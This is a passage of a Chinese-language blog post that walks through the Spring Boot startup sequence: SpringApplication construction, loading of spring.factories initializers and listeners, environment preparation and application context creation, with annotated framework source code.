      <url>/Spring/spring/spring-boot-workflow/</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><ul><li>要求对 Spring 有一定了解知道 Spring 和 spring boot 之间的关系</li><li>对 Servlet 有一定了解</li><li>对类加载器有一定了解</li></ul><h3 id="spring-预习"><a href="#spring-预习" class="headerlink" title="spring 预习"></a>spring 预习</h3><p>spring 本质上就是一个帮你加载类，管理类的库，所以被称作 IOC 容器。</p><ul><li>spring-core spring 核心基础能力：<ul><li>动态代理 cglib</li><li>类解析 asm</li><li>类实例化 objenesis</li><li>基础注解  core.annotation</li><li>编解码 core.codec</li><li>类型转换器 core.convert</li><li>配置文件解析 core.env</li><li>资源读取 core.io</li><li>日志 core.log</li><li>序列化 core.serializer</li><li>格式化输出 core.style</li><li>多线程任务 core.task</li><li>注解处理 core.type</li><li>工具包<ul><li>退避算法 util.backoff</li><li>比较器 util.comparator</li><li>并发工具 util.concurrent</li><li>单位 util.unit</li><li>函数式工具 util.function</li><li>xml 处理工具 util.xml</li></ul></li><li>其他常用的工具类<ul><li>TODO </li></ul></li></ul></li><li>spring-beans 对 bean 各种操作<ul><li>bean 工厂 factory</li><li>bean 的属性编辑器</li><li>bean 工具</li></ul></li><li>spring-aop 实现切片编程的逻辑</li><li>spring-expression  EL 表达式，基本实现了一个 DSL</li><li>spring-context 整合上面的组件，提供给应用程序一个上下文容器<ul><li>cache 缓存相关</li><li>context  应用上下文相关<ul><li>annotation</li><li>config</li><li>event</li><li>expression</li><li>i18n</li><li>index</li><li>support</li><li>weaving</li></ul></li><li>format</li><li>scheduling 计划任务</li><li>scripting</li><li>stereotype  模板类型，例如 Controller </li><li>validation 数据验证</li></ul></li></ul><h3 id="spring-boot、-spring、spring-mvc-的关系"><a href="#spring-boot、-spring、spring-mvc-的关系" class="headerlink" title="spring boot、 spring、spring mvc 的关系"></a>spring boot、 spring、spring mvc 的关系</h3><p>spring 是一个 IOC 容器，负责初始化对象，以及管理对象。可以看做一个库，无法作为一个应用启动。spring 实际上与 web 应用无关，但是也提供了很多 web 应用的支持。</p><p>spring boot 是一个整合了 spring 等其他技术的应用框架，开发者需要根据 spring boot 的逻辑来进行开发，spring boot 帮忙做了很多默认配置。</p><p>spring mvc  是一个响应 servlet 请求并完成请求路由映射、模型加载、视图渲染等经典 MVC 框架。</p><h1 id="Spring-boot-启动过程"><a href="#Spring-boot-启动过程" class="headerlink" title="Spring boot 启动过程"></a>Spring boot 启动过程</h1><h2 id="1-执行入口方法"><a href="#1-执行入口方法" class="headerlink" title="1 执行入口方法"></a>1 执行入口方法</h2><pre><code class="java">@SpringBootApplicationpublic class SpringBootBestPracticeApplication {    public static void main(String[] args) {        SpringApplication.run(SpringBootBestPracticeApplication.class, args);    }}</code></pre><h2 id="2-构造应用实例-new-SpringApplication"><a href="#2-构造应用实例-new-SpringApplication" class="headerlink" title="2 构造应用实例 new SpringApplication()"></a>2 构造应用实例 new SpringApplication()</h2><p>实例化 SpringApplication 对象</p><pre><code class="java">public static ConfigurableApplicationContext run(Class&lt;?&gt;[] primarySources,      String[] args) {   // 2. 构建应用实例   SpringApplication app = new SpringApplication(primarySources);   // 3. 运行应用实例   return app.run(args);}</code></pre><pre><code class="java">public SpringApplication(ResourceLoader resourceLoader, Class&lt;?&gt;... primarySources) {   // 2.1 资源初始化资源加载器为 null   this.resourceLoader = resourceLoader;   Assert.notNull(primarySources, &quot;PrimarySources must not be null&quot;);   this.primarySources = new LinkedHashSet&lt;&gt;(Arrays.asList(primarySources));   // 2.2 推断当前 WEB 应用类型,判断是一个 webflux 还是普通 servlet 项目，或者不是 web 项目   this.webApplicationType = WebApplicationType.deduceFromClasspath();   // 2.3 设置应用上下文初始化器 ,ApplicationContextInitializer 接口负责在项目启动时候初始话各种资源，这里支持不同的初始化器，例如加载配置文件、注册属性资源、激活 Profiles   setInitializers((Collection) getSpringFactoriesInstances(         ApplicationContextInitializer.class));   // 2.4 设置监听器   setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));   // 2.5 推断主入口应用类   this.mainApplicationClass = deduceMainApplicationClass();}</code></pre><h3 id="2-1-资源初始化资源加载器为-null"><a href="#2-1-资源初始化资源加载器为-null" class="headerlink" title="2.1 资源初始化资源加载器为 null"></a>2.1 资源初始化资源加载器为 null</h3><h3 id="2-2-推断应用类型"><a href="#2-2-推断应用类型" class="headerlink" title="2.2 推断应用类型"></a>2.2 推断应用类型</h3><pre><code class="java">static WebApplicationType deduceFromClasspath() {   if (ClassUtils.isPresent(WEBFLUX_INDICATOR_CLASS, null)         &amp;&amp; !ClassUtils.isPresent(WEBMVC_INDICATOR_CLASS, null)         &amp;&amp; !ClassUtils.isPresent(JERSEY_INDICATOR_CLASS, null)) {      return WebApplicationType.REACTIVE;   }   for (String className : SERVLET_INDICATOR_CLASSES) {      if (!ClassUtils.isPresent(className, null)) {         return WebApplicationType.NONE;      }   }   return WebApplicationType.SERVLET;}</code></pre><p>ClassUtils.isPresent 检测 org.springframework.web.reactive.DispatcherHandler 这个类是否存在，并且没有加载 Spring mvc 以及 Jersey 可以判定为 REACTIVE 模式。</p><p>如果没有加载任何 ConfigurableWebApplicationContext 相关的类，判定为非 web 项目。</p><h3 id="2-3-构造-SpringApplication-的上下文初始化器"><a href="#2-3-构造-SpringApplication-的上下文初始化器" class="headerlink" title="2.3 构造 SpringApplication  的上下文初始化器"></a>2.3 构造 SpringApplication  的上下文初始化器</h3><p>获取初始化器的实例</p><pre><code class="java">private &lt;T&gt; Collection&lt;T&gt; getSpringFactoriesInstances(Class&lt;T&gt; type,      Class&lt;?&gt;[] parameterTypes, Object... args) {   // 2.3.1 通过 SpringFactoriesLoader.loadFactoryNames 加载该接口的所有实现   ClassLoader classLoader = getClassLoader();   // 2.3.2 通过 SpringFactoriesLoader.loadFactoryNames 加载该接口的所有实现   Set&lt;String&gt; names = new LinkedHashSet&lt;&gt;(         SpringFactoriesLoader.loadFactoryNames(type, classLoader));   // 2.3.3 使用 BeanUtils.instantiateClass 实例化所有的类   List&lt;T&gt; instances = createSpringFactoriesInstances(type, parameterTypes,         classLoader, args, names);   // 2.3.4 使用 BeanUtils.instantiateClass 使用注解比较器进行排序   AnnotationAwareOrderComparator.sort(instances);   return instances;}</code></pre><h4 id="2-3-1-获取-class-loader"><a href="#2-3-1-获取-class-loader" class="headerlink" title="2.3.1 获取 class loader"></a>2.3.1 获取 class loader</h4><pre><code class="java">if (this.resourceLoader != null) {   return this.resourceLoader.getClassLoader();}return ClassUtils.getDefaultClassLoader();</code></pre><p>ClassUtils 的实现原理为 Thread.currentThread().getContextClassLoader();  并做了回退处理</p><ul><li>Thread.currentThread().getContextClassLoader(); </li><li>ClassUtils.class.getClassLoader();</li><li>ClassLoader.getSystemClassLoader();</li></ul><h4 id="2-3-2-加载初始化类名"><a href="#2-3-2-加载初始化类名" class="headerlink" title="2.3.2 加载初始化类名"></a>2.3.2 加载初始化类名</h4><pre><code class="java">        public static List&lt;String&gt; loadFactoryNames(Class&lt;?&gt; factoryClass, @Nullable ClassLoader classLoader) {        String factoryClassName = factoryClass.getName();        return loadSpringFactories(classLoader).getOrDefault(factoryClassName, Collections.emptyList());    }</code></pre><pre><code class="java">private static Map&lt;String, List&lt;String&gt;&gt; loadSpringFactories(@Nullable ClassLoader classLoader) {   MultiValueMap&lt;String, String&gt; result = cache.get(classLoader);   if (result != null) {      return result;   }   try {      Enumeration&lt;URL&gt; urls = (classLoader != null ?            classLoader.getResources(FACTORIES_RESOURCE_LOCATION) :            ClassLoader.getSystemResources(FACTORIES_RESOURCE_LOCATION));      result = new LinkedMultiValueMap&lt;&gt;();      while (urls.hasMoreElements()) {         URL url = urls.nextElement();         UrlResource resource = new UrlResource(url);         Properties properties = PropertiesLoaderUtils.loadProperties(resource);         for (Map.Entry&lt;?, ?&gt; entry : properties.entrySet()) {            String factoryClassName = ((String) entry.getKey()).trim();            for (String factoryName : StringUtils.commaDelimitedListToStringArray((String) entry.getValue())) {               result.add(factoryClassName, factoryName.trim());            }         }      }      cache.put(classLoader, result);      return result;   }   catch (IOException ex) {      throw new IllegalArgumentException(&quot;Unable to load factories from location [&quot; +            FACTORIES_RESOURCE_LOCATION + &quot;]&quot;, ex);   }}</code></pre><p>基本原理是通过 class loader 找到 META-INF/spring.factories 文件解析并获取 <code>ApplicationContextInitializer</code> 接口的所有配置的类路径名称。</p><p>这里非常关键，spring boot 通过加载不同的 ApplicationContextInitializer 对上下文进行初始化，这是 spring boot 应用具有大量特性的同时也能保持灵活性的重要手段。</p><p>urls 是类加载器以及双亲委派模式下的类加载器加载出来的所有资源，然后遍历获取需要的类。</p><p>ApplicationContextInitializer 的类定义有几个潜在来源：</p><ul><li>spring boot 本身提供了4 个类</li><li>devtools 提供了1个用于热加载后刷新上下文的类</li><li>autoconfigure 提供了2个用于自动配置的类</li></ul><p>我加载了 devtools 因此加载了7个上下文初始化类。</p><pre><code>0 = &quot;org.springframework.boot.devtools.restart.RestartScopeInitializer&quot;1 = &quot;org.springframework.boot.autoconfigure.SharedMetadataReaderFactoryContextInitializer&quot;2 = &quot;org.springframework.boot.autoconfigure.logging.ConditionEvaluationReportLoggingListener&quot;3 = &quot;org.springframework.boot.context.ConfigurationWarningsApplicationContextInitializer&quot;4 = &quot;org.springframework.boot.context.ContextIdApplicationContextInitializer&quot;5 = &quot;org.springframework.boot.context.config.DelegatingApplicationContextInitializer&quot;6 = &quot;org.springframework.boot.web.context.ServerPortInfoApplicationContextInitializer&quot;</code></pre><p>这里使用了一个 LinkedMultiValueMap 数据结构，可以为一个 key 存储多个值，构建出一个树类似的结构，便于解析 properties 文件。</p><p>可以把从不同的 spring.factories 中的代码块汇集到一个对象中，一个 spring.factories 数据结构如下</p><pre><code># Error Reportersorg.springframework.boot.SpringBootExceptionReporter=\org.springframework.boot.diagnostics.FailureAnalyzers# Application Context Initializersorg.springframework.context.ApplicationContextInitializer=\org.springframework.boot.context.ConfigurationWarningsApplicationContextInitializer,\org.springframework.boot.context.ContextIdApplicationContextInitializer,\org.springframework.boot.context.config.DelegatingApplicationContextInitializer,\org.springframework.boot.web.context.ServerPortInfoApplicationContextInitializer</code></pre><p>如果有多个 jar 包中都有 ApplicationContextInitializer配置块，通过LinkedMultiValueMap 可以很方便的合并同样key的集合。</p><h4 id="2-3-3-实例化初始化器类"><a href="#2-3-3-实例化初始化器类" class="headerlink" title="2.3.3 实例化初始化器类"></a>2.3.3 实例化初始化器类</h4><pre><code class="java">@SuppressWarnings(&quot;unchecked&quot;)private &lt;T&gt; List&lt;T&gt; createSpringFactoriesInstances(Class&lt;T&gt; type,      Class&lt;?&gt;[] parameterTypes, ClassLoader classLoader, Object[] args,      Set&lt;String&gt; names) {   List&lt;T&gt; instances = new ArrayList&lt;&gt;(names.size());   for (String name : names) {      try {         Class&lt;?&gt; instanceClass = ClassUtils.forName(name, classLoader);         Assert.isAssignable(type, instanceClass);         Constructor&lt;?&gt; constructor = instanceClass               .getDeclaredConstructor(parameterTypes);         T instance = (T) BeanUtils.instantiateClass(constructor, args);         instances.add(instance);      }      catch (Throwable ex) {         throw new IllegalArgumentException(               &quot;Cannot instantiate &quot; + type + &quot; : &quot; + name, ex);      }   }   return instances;}</code></pre><h4 id="2-3-4-使用注解比较器进行排序"><a href="#2-3-4-使用注解比较器进行排序" class="headerlink" title="2.3.4 使用注解比较器进行排序"></a>2.3.4 使用注解比较器进行排序</h4><pre><code class="java">public static void sort(List&lt;?&gt; list) {   if (list.size() &gt; 1) {      list.sort(INSTANCE);   }}</code></pre><p>INSTANCE 是 AnnotationAwareOrderComparator 的一个单例，继承 OrderComparator 实现通过顺序进行比较。AnnotationAwareOrderComparator 的职责是通过找到 Order 注解进行排序。</p><h3 id="2-4-设置监听器"><a href="#2-4-设置监听器" class="headerlink" title="2.4 设置监听器"></a>2.4 设置监听器</h3><p>获取监听器的原理和上下文初始化器一样，不过类型换成了 ApplicationListener。</p><pre><code class="properties"># Application Listenersorg.springframework.context.ApplicationListener=\org.springframework.boot.ClearCachesApplicationListener,\org.springframework.boot.builder.ParentContextCloserApplicationListener,\org.springframework.boot.context.FileEncodingApplicationListener,\org.springframework.boot.context.config.AnsiOutputApplicationListener,\org.springframework.boot.context.config.ConfigFileApplicationListener,\org.springframework.boot.context.config.DelegatingApplicationListener,\org.springframework.boot.context.logging.ClasspathLoggingApplicationListener,\org.springframework.boot.context.logging.LoggingApplicationListener,\org.springframework.boot.liquibase.LiquibaseServiceLocatorApplicationListener</code></pre><h3 id="2-5-推断主入口应用类"><a href="#2-5-推断主入口应用类" class="headerlink" title="2.5 推断主入口应用类"></a>2.5 推断主入口应用类</h3><pre><code class="java">private Class&lt;?&gt; deduceMainApplicationClass() {   try {      StackTraceElement[] stackTrace = new RuntimeException().getStackTrace();      for (StackTraceElement stackTraceElement : stackTrace) {         if (&quot;main&quot;.equals(stackTraceElement.getMethodName())) {            return Class.forName(stackTraceElement.getClassName());         }      }   }   catch (ClassNotFoundException ex) {      // Swallow and continue   }   return null;}</code></pre><p>通过构造一个运行时异常，再遍历异常栈中的方法名，获取方法名为 main 的栈帧，从来得到入口类的名字再返回该类。</p><p>应用程序的主入口 Spring boot 并不知道，通过模拟一个异常栈，根据异常栈中的元素找出 main 方法，通过这种方式获取入口应用类。</p><h2 id="3-运行应用实例"><a href="#3-运行应用实例" class="headerlink" title="3 运行应用实例"></a>3 运行应用实例</h2><p>上面分析了创建 SpringApplication 实例的过程，下面分析实例创建后是如何被启动的。</p><pre><code class="java">public ConfigurableApplicationContext run(String... args) {   // 3.1 创建并启动计时监控类   StopWatch stopWatch = new StopWatch();   stopWatch.start();   // 初始化应用上下文和异常报告集合   ConfigurableApplicationContext context = null;   Collection&lt;SpringBootExceptionReporter&gt; exceptionReporters = new ArrayList&lt;&gt;();   // 3.2 设置系统属性 `java.awt.headless` 的值，默认值为：true   configureHeadlessProperty();   // 3.3 创建所有 Spring 运行监听器并发布应用启动事件   SpringApplicationRunListeners listeners = getRunListeners(args);   listeners.starting();   try {      // 3.4 初始化默认应用参数类      ApplicationArguments applicationArguments = new DefaultApplicationArguments(            args);      // 3.5 根据运行监听器和应用参数来准备 Spring 环境      ConfigurableEnvironment environment = prepareEnvironment(listeners,            applicationArguments);      // 根据 spring.beaninfo.ignore 配置忽略 bean      configureIgnoreBeanInfo(environment);      // 3.6 创建 Banner 打印类       Banner printedBanner = printBanner(environment);      // 3.7 创建应用上下文      context = createApplicationContext();      // 准备异常报告器      exceptionReporters = getSpringFactoriesInstances(            SpringBootExceptionReporter.class,            new Class[] { ConfigurableApplicationContext.class }, context);      // 3.8 准备应用上下文      prepareContext(context, environment, listeners, applicationArguments,            printedBanner);      // 3.9 刷新应用上下文      refreshContext(context);      // 3.10 应用上下文刷新后置处理      afterRefresh(context, applicationArguments);         // 3.11 停止计时监控类      stopWatch.stop();      // 3.12 输出日志记录执行主类名、时间信息      if (this.logStartupInfo) {         new StartupInfoLogger(this.mainApplicationClass)               .logStarted(getApplicationLog(), stopWatch);      }      // 3.13 发布应用上下文启动完成事件      listeners.started(context);      // 3.14 执行所有 Runner 运行器      callRunners(context, applicationArguments);   }   catch (Throwable ex) {      handleRunFailure(context, ex, exceptionReporters, listeners);      throw new IllegalStateException(ex);   }   try {      // 3.15 发布应用上下文就绪事件      listeners.running(context);   }   catch (Throwable ex) {      // 3.16 处理运行异常      handleRunFailure(context, ex, exceptionReporters, null);      throw new IllegalStateException(ex);   }   return context;}</code></pre><h3 id="3-1-创建并启动计时监控类"><a href="#3-1-创建并启动计时监控类" class="headerlink" title="3.1 创建并启动计时监控类"></a>3.1 创建并启动计时监控类</h3><pre><code class="java">StopWatch stopWatch = new StopWatch();stopWatch.start();</code></pre><p>StopWatch 的源码</p><pre><code class="java">public void start() throws IllegalStateException {    start(&quot;&quot;);}public void start(String taskName) throws IllegalStateException {    if (this.currentTaskName != null) {        throw new IllegalStateException(&quot;Can&#39;t start StopWatch: it&#39;s already running&quot;);    }    this.currentTaskName = taskName;    this.startTimeMillis = System.currentTimeMillis();}</code></pre><p>首先记录了当前任务的名称，默认为空字符串，然后记录当前 Spring Boot 应用启动的开始时间。</p><h3 id="3-2-设置系统属性-java-awt-headless"><a href="#3-2-设置系统属性-java-awt-headless" class="headerlink" title="3.2 设置系统属性 java.awt.headless"></a>3.2 设置系统属性 <code>java.awt.headless</code></h3><pre><code class="java">private void configureHeadlessProperty() {   System.setProperty(SYSTEM_PROPERTY_JAVA_AWT_HEADLESS, System.getProperty(         SYSTEM_PROPERTY_JAVA_AWT_HEADLESS, Boolean.toString(this.headless)));}</code></pre><p>设置变量 <code>Java.awt.headless = true</code> </p><blockquote><p>Java包含很多类，这些类假设有某种显示和一个附加的键盘。有时，你写的代码运行在一个没有这些的服务器上，这被称为无头模式。有时，你写的代码运行在一个没有这些的服务器上，这被称为无头模式。从Java 1.4开始，您就可以明确地告诉Java以Headless模式运行。</p><p><a href="https://stackoverflow.com/questions/2552371/setting-java-awt-headless-true-programmatically" target="_blank" rel="noopener">https://stackoverflow.com/questions/2552371/setting-java-awt-headless-true-programmatically</a></p></blockquote><h3 id="3-3-创建所有-Spring-运行监听器并发布应用启动事件"><a href="#3-3-创建所有-Spring-运行监听器并发布应用启动事件" class="headerlink" title="3.3 创建所有 Spring 运行监听器并发布应用启动事件"></a>3.3 创建所有 Spring 运行监听器并发布应用启动事件</h3><pre><code class="java">private SpringApplicationRunListeners getRunListeners(String[] args) {   Class&lt;?&gt;[] types = new Class&lt;?&gt;[] { SpringApplication.class, String[].class };   return new SpringApplicationRunListeners(logger, getSpringFactoriesInstances(         SpringApplicationRunListener.class, types, this, args));}</code></pre><p>创建逻辑和之前实例化初始化器和监听器的一样，一样调用的是 <code>getSpringFactoriesInstances</code> 方法来获取配置的监听器名称并实例化所有的类。</p><pre><code class="properties"># Run Listenersorg.springframework.boot.SpringApplicationRunListener=\org.springframework.boot.context.event.EventPublishingRunListener</code></pre><h3 id="3-4-初始化默认应用参数类"><a href="#3-4-初始化默认应用参数类" class="headerlink" title="3.4 初始化默认应用参数类"></a>3.4 初始化默认应用参数类</h3><pre><code class="java">ApplicationArguments applicationArguments = new DefaultApplicationArguments(      args);</code></pre><p>只是用一个类 DefaultApplicationArguments  包装了一下参数输入。</p><h3 id="3-5-根据应用参数来准备环境"><a href="#3-5-根据应用参数来准备环境" class="headerlink" title="3.5 根据应用参数来准备环境"></a>3.5 根据应用参数来准备环境</h3><pre><code class="java">ConfigurableEnvironment environment = prepareEnvironment(listeners,      applicationArguments);</code></pre><pre><code class="java">private ConfigurableEnvironment prepareEnvironment(      SpringApplicationRunListeners listeners,      ApplicationArguments applicationArguments) {   // Create and configure the environment   // 3.5.1 获取或者创建应用环境   ConfigurableEnvironment environment = getOrCreateEnvironment();   // 3.5.2 配置应用环境   configureEnvironment(environment, applicationArguments.getSourceArgs());   // 发布事件   listeners.environmentPrepared(environment);   // 3.5.3 绑定环境   bindToSpringApplication(environment);   if (!this.isCustomEnvironment) {     // 3.5.4 自定义环境转换      environment = new EnvironmentConverter(getClassLoader())            .convertEnvironmentIfNecessary(environment, deduceEnvironmentClass());   }   // 3.5.5 附加配置属性   ConfigurationPropertySources.attach(environment);   return environment;}</code></pre><h4 id="3-5-1-获取或者创建应用环境"><a href="#3-5-1-获取或者创建应用环境" class="headerlink" title="3.5.1 获取或者创建应用环境"></a>3.5.1 获取或者创建应用环境</h4><pre><code class="java">private ConfigurableEnvironment getOrCreateEnvironment() {   if (this.environment != null) {      return this.environment;   }   switch (this.webApplicationType) {   case SERVLET:      return new StandardServletEnvironment();   case REACTIVE:      return new StandardReactiveWebEnvironment();   default:      return new StandardEnvironment();   }}</code></pre><p>根据应用类型的不同，存在3种实现:</p><ul><li>StandardServletEnvironment</li><li>StandardReactiveWebEnvironment </li><li>StandardEnvironment </li></ul><p>StandardServletEnvironment、StandardReactiveWebEnvironment 都是继承于 StandardEnvironment，用于管理系统环境变量以及配置文件。</p><p>Environment 对象就是存放我们设置的 profile 信息，默认为 default。</p><h4 id="3-5-2-配置应用环境"><a href="#3-5-2-配置应用环境" class="headerlink" title="3.5.2 配置应用环境"></a>3.5.2 配置应用环境</h4><pre><code class="java">configureEnvironment(environment, applicationArguments.getSourceArgs());</code></pre><p>使用刚刚创建的环境对象管理环境参数。</p><pre><code class="java">protected void configureEnvironment(ConfigurableEnvironment environment,      String[] args) {   // 3.5.2.1 配置转换服务   if (this.addConversionService) {      ConversionService conversionService = ApplicationConversionService            .getSharedInstance();      environment.setConversionService(            (ConfigurableConversionService) conversionService);   }   // 3.5.2.2 配置属性资源   configurePropertySources(environment, args);   // 3.5.2.3 配置 profiles   configureProfiles(environment, args);}</code></pre><h5 id="3-5-2-1-配置转换服务"><a href="#3-5-2-1-配置转换服务" class="headerlink" title="3.5.2.1 配置转换服务"></a>3.5.2.1 配置转换服务</h5><p>addConversionService 默认为 true，提供一个数据类型转换服务。在配置文件中大多是使用字符串，帮我们转换成容易使用的数据类型，例如 duration 这类的配置可以被转换成数值。</p><p>getSharedInstance() 是一个单例实现，用于组合各种数据类型的转换器、文本解析器，可以学习一下。</p><pre><code class="java">public static ConversionService getSharedInstance() {   ApplicationConversionService sharedInstance = ApplicationConversionService.sharedInstance;   if (sharedInstance == null) {      synchronized (ApplicationConversionService.class) {         sharedInstance = ApplicationConversionService.sharedInstance;         if (sharedInstance == null) {            sharedInstance = new ApplicationConversionService();            ApplicationConversionService.sharedInstance = sharedInstance;         }      }   }   return sharedInstance;}</code></pre><p>ApplicationConversionService 注册了大量的转换器，确保配置被合理的转换成特定的数据类型。</p><pre><code class="java">public static void addApplicationConverters(ConverterRegistry registry) {   addDelimitedStringConverters(registry);   registry.addConverter(new StringToDurationConverter());   registry.addConverter(new DurationToStringConverter());   registry.addConverter(new NumberToDurationConverter());   registry.addConverter(new DurationToNumberConverter());   registry.addConverter(new StringToDataSizeConverter());   registry.addConverter(new NumberToDataSizeConverter());   registry.addConverterFactory(new StringToEnumIgnoringCaseConverterFactory());}</code></pre><p>addDelimitedStringConverters 中包含了大量逗号分隔符的转换器，用于将逗号分隔的字符串转换成集合。</p><pre><code class="java">public static void addDelimitedStringConverters(ConverterRegistry registry) {   ConversionService service = (ConversionService) registry;   registry.addConverter(new ArrayToDelimitedStringConverter(service));   registry.addConverter(new CollectionToDelimitedStringConverter(service));   registry.addConverter(new DelimitedStringToArrayConverter(service));   registry.addConverter(new DelimitedStringToCollectionConverter(service));}</code></pre><p>有一些专门的解析和生成字符串类的格式化器，具有格式化成字符串、解析字符串的能力。</p><pre><code class="java">public static void addApplicationFormatters(FormatterRegistry registry) {   registry.addFormatter(new CharArrayFormatter());   registry.addFormatter(new InetAddressFormatter());   registry.addFormatter(new IsoOffsetFormatter());}</code></pre><p>转换器和格式化器继承的父类和实现的接口不太一样。</p><p><img src="/Spring/spring/spring-boot-workflow/image-20200405145057079.png" alt="image-20200405145057079"></p><center>（转换器）<center><br><img src="/Spring/spring/spring-boot-workflow/image-20200405145258465.png" alt="image-20200405145258465"><br><br><center>(格式化器)</center><h5 id="3-5-2-2-配置属性资源"><a href="#3-5-2-2-配置属性资源" class="headerlink" title="3.5.2.2 配置属性资源"></a>3.5.2.2 配置属性资源</h5><pre><code class="java">protected void configurePropertySources(ConfigurableEnvironment environment,      String[] args) {   MutablePropertySources sources = environment.getPropertySources();   if (this.defaultProperties != null &amp;&amp; !this.defaultProperties.isEmpty()) {      sources.addLast(            new MapPropertySource(&quot;defaultProperties&quot;, this.defaultProperties));   }   if (this.addCommandLineProperties &amp;&amp; args.length &gt; 0) {      String name = CommandLinePropertySource.COMMAND_LINE_PROPERTY_SOURCE_NAME;      if (sources.contains(name)) {         PropertySource&lt;?&gt; source = sources.get(name);         CompositePropertySource composite = new CompositePropertySource(name);         composite.addPropertySource(new SimpleCommandLinePropertySource(               &quot;springApplicationCommandLineArgs&quot;, args));         composite.addPropertySource(source);         sources.replace(name, composite);      }      else {         sources.addFirst(new SimpleCommandLinePropertySource(args));      }   }}</code></pre><p>这里将命令行中的配置添加到，配置列表中，因为 spring boot 支持各种各样的配置来源，因此需要做大量类似的工作。这里根据命令行参数添加了 <code>SimpleCommandLinePropertySource</code>配置来源。</p><p>参考 <a href="https://docs.spring.io/spring-boot/docs/2.2.6.RELEASE/reference/htmlsingle/#boot-features-external-config" target="_blank" rel="noopener">https://docs.spring.io/spring-boot/docs/2.2.6.RELEASE/reference/htmlsingle/#boot-features-external-config</a></p><h5 id="3-5-2-3-配置-profiles"><a href="#3-5-2-3-配置-profiles" class="headerlink" title="3.5.2.3 配置 profiles"></a>3.5.2.3 配置 profiles</h5><pre><code class="java">protected void configureProfiles(ConfigurableEnvironment environment, String[] args) {   environment.getActiveProfiles(); // ensure they are initialized   // But these ones should go first (last wins in a property key clash)   Set&lt;String&gt; profiles = new LinkedHashSet&lt;&gt;(this.additionalProfiles);   profiles.addAll(Arrays.asList(environment.getActiveProfiles()));   environment.setActiveProfiles(StringUtils.toStringArray(profiles));}</code></pre><p>通过获取到的 profiles 信息，设置当前激活的 profiles。</p><h4 id="3-5-3-绑定配置信息到对象上"><a href="#3-5-3-绑定配置信息到对象上" class="headerlink" title="3.5.3 绑定配置信息到对象上"></a>3.5.3 绑定配置信息到对象上</h4><pre><code class="java">protected void bindToSpringApplication(ConfigurableEnvironment environment) {   try {      Binder.get(environment).bind(&quot;spring.main&quot;, Bindable.ofInstance(this));   }   catch (Exception ex) {      throw new IllegalStateException(&quot;Cannot bind to SpringApplication&quot;, ex);   }}</code></pre><p>pringboot 2.x新引入的类，负责处理对象与多个 ConfigurationPropertySource（属性）之间的绑定，可以将多个配置属性绑定到类的属性上，这里面的内容比较复杂，不再过深入展开。</p><h4 id="3-5-4-自定义环境转换"><a href="#3-5-4-自定义环境转换" class="headerlink" title="3.5.4 自定义环境转换"></a>3.5.4 自定义环境转换</h4><pre><code class="java">if (!this.isCustomEnvironment) {   environment = new EnvironmentConverter(getClassLoader())         .convertEnvironmentIfNecessary(environment, deduceEnvironmentClass());}</code></pre><p>如果在最开始传入的 environment 对象不是 deduceEnvironmentClass() 中的三种之一，那么需要转换，默认为关闭状态。</p><pre><code class="java">private Class&lt;? extends StandardEnvironment&gt; deduceEnvironmentClass() {   switch (this.webApplicationType) {   case SERVLET:      return StandardServletEnvironment.class;   case REACTIVE:      return StandardReactiveWebEnvironment.class;   default:      return StandardEnvironment.class;   }}</code></pre><h4 id="3-5-5-附加配置属性"><a href="#3-5-5-附加配置属性" class="headerlink" title="3.5.5 附加配置属性"></a>3.5.5 附加配置属性</h4><pre><code class="java">public static void attach(Environment environment) {   Assert.isInstanceOf(ConfigurableEnvironment.class, environment);   MutablePropertySources sources = ((ConfigurableEnvironment) environment)         .getPropertySources();   PropertySource&lt;?&gt; attached = sources.get(ATTACHED_PROPERTY_SOURCE_NAME);   if (attached != null &amp;&amp; attached.getSource() != sources) {      sources.remove(ATTACHED_PROPERTY_SOURCE_NAME);      attached = null;   }   if (attached == null) {      sources.addFirst(new ConfigurationPropertySourcesPropertySource(            ATTACHED_PROPERTY_SOURCE_NAME,            new SpringConfigurationPropertySources(sources)));   }}</code></pre><p>TODO 这段代码还不知道干嘛用的，尤其是 SpringConfigurationPropertySources 这个类</p><h3 id="3-6-创建-Banner-打印类"><a href="#3-6-创建-Banner-打印类" class="headerlink" title="3.6 创建 Banner 打印类"></a>3.6 创建 Banner 打印类</h3><pre><code class="java">private Banner printBanner(ConfigurableEnvironment environment) {   if (this.bannerMode == Banner.Mode.OFF) {      return null;   }   ResourceLoader resourceLoader = (this.resourceLoader != null)         ? this.resourceLoader : new DefaultResourceLoader(getClassLoader());   SpringApplicationBannerPrinter bannerPrinter = new SpringApplicationBannerPrinter(         resourceLoader, this.banner);   if (this.bannerMode == Mode.LOG) {      return bannerPrinter.print(environment, this.mainApplicationClass, logger);   }   return bannerPrinter.print(environment, this.mainApplicationClass, System.out);}</code></pre><p>打印一个 banner 信息，基本的逻辑就是 SpringApplicationBannerPrinter 类根据配置文件在指定的位置打印出 banner，根据 banner 输出的模式分为日志、控制台、不打印。</p><h3 id="3-7-创建应用上下文-核心点"><a href="#3-7-创建应用上下文-核心点" class="headerlink" title="3.7 创建应用上下文 [核心点]"></a>3.7 创建应用上下文 [核心点]</h3><pre><code class="java">protected ConfigurableApplicationContext createApplicationContext() {   Class&lt;?&gt; contextClass = this.applicationContextClass;   if (contextClass == null) {      try {         switch (this.webApplicationType) {         case SERVLET:            contextClass = Class.forName(DEFAULT_SERVLET_WEB_CONTEXT_CLASS);            break;         case REACTIVE:            contextClass = Class.forName(DEFAULT_REACTIVE_WEB_CONTEXT_CLASS);            break;         default:            contextClass = Class.forName(DEFAULT_CONTEXT_CLASS);         }      }      catch (ClassNotFoundException ex) {         throw new IllegalStateException(               &quot;Unable create a default ApplicationContext, &quot;                     + &quot;please specify an ApplicationContextClass&quot;,               ex);      }   }   return (ConfigurableApplicationContext) BeanUtils.instantiateClass(contextClass);}</code></pre><p>非常关键的一个环节，初始化一个 Spring boot 上下文，在这个上下文中会启动 Spring 上下文，实际上在这之前还没有启动 Spring 。根据不同的应用类型初始不同的上下文，如果是一个普通 web 应用，默认初始化的是  <code>AnnotationConfigServletWebServerApplicationContext</code> 。</p><p>使用 BeanUtils.instantiateClass 来初始化一个类，这种初始化方法能使用 Spring 类的生命周期注解。这里默认构造了一个上下文，通过这个上下文在后面利用 spring 初始化 bean 的时候非常重要。</p><p>基本上这个类是 Spring boot 继承于 Spring 中的 ServletWebServerApplicationContext，ServletWebServerApplicationContext 有继承于 GenericApplicationContext。GenericApplicationContext 